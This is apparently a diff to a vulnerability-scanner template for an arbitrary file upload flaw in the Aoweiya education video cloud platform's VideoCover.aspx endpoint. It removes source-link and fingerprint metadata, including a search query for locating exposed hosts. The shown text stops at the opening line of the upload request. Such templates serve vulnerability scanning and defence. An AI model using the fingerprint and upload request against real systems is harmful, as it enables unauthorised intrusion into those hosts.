@@ -3,14 +3,8 @@ info:
   name: 奥威亚教育视频云平台VideoCover存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a8f1fa5889895da1562c229bb9c2e936
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: a8f1fa5889895da1562c229bb9c2e936
-    fofa: + hunter`web.body="/CSS/NewtonTheme/assets/app.css"`
 http:
 - raw:
   - 'POST /Tools/Video/VideoCover.aspx HTTP/1.1
